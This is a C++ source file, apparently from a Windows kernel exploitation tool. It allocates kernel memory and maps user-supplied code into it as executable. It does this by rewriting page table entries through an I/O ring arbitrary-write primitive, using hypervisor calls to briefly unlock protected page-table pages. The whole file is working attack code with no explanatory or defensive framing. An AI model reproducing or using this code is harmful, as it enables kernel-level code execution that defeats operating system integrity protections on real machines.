#include "kernel.hpp"
#include "win_defs.h"
#include <phnt_windows.h>
#include <phnt.h>

#include "hv.h"

namespace collat::kernel {
    void* alloc_exec_mem(size_t size) {
        void* mdl = kernel::call<void*>(
            "ntoskrnl.exe",
            "MmAllocatePagesForMdlEx",
            0, (UINT64)-1, 0, size, 0, 0
        );

        if(!mdl) {
            spdlog::error("failed to allocate pages for mdl");
            return nullptr;
        }

        void* address = kernel::call<void*>(
            "ntoskrnl.exe",
            "MmMapLockedPagesSpecifyCache",
            mdl,
            0,
            0,
            NULL,
            FALSE,
            16
        );

        return address;
    }


    void* map_code_into_kernel(void* code, size_t size) {
        auto mem = get_ioring();

        auto mapped = alloc_exec_mem(size);

        auto kernel_pte = get_pagetable_entry(reinterpret_cast<uint64_t>(mapped));
        auto kernel_pte_address = get_pte_address(reinterpret_cast<uint64_t>(mapped));
        auto code_pte = get_pagetable_entry(reinterpret_cast<uint64_t>(code));

        auto kernel_pte_page = kernel::call<uint64_t>("ntoskrnl.exe", "MmGetPhysicalAddress", kernel_pte) & 0xfffffffffffff000;

        kernel_pte.u.Hard.NoExecute = FALSE;
        kernel_pte.u.Hard.Write = FALSE;
        kernel_pte.u.Hard.PageFrameNumber = code_pte.u.Hard.PageFrameNumber;

        uint64_t out;
        uint64_t repcnt = 1;
        hv::make_data_page_writeable(&kernel_pte_page, 1, &out, 8, &repcnt);

        mem->write64(kernel_pte_address, kernel_pte.u.Long);

        repcnt = 1;
        hv::make_data_page_readonly(&kernel_pte_page, 1, &out, 8, &repcnt);

        return mapped;
    }
}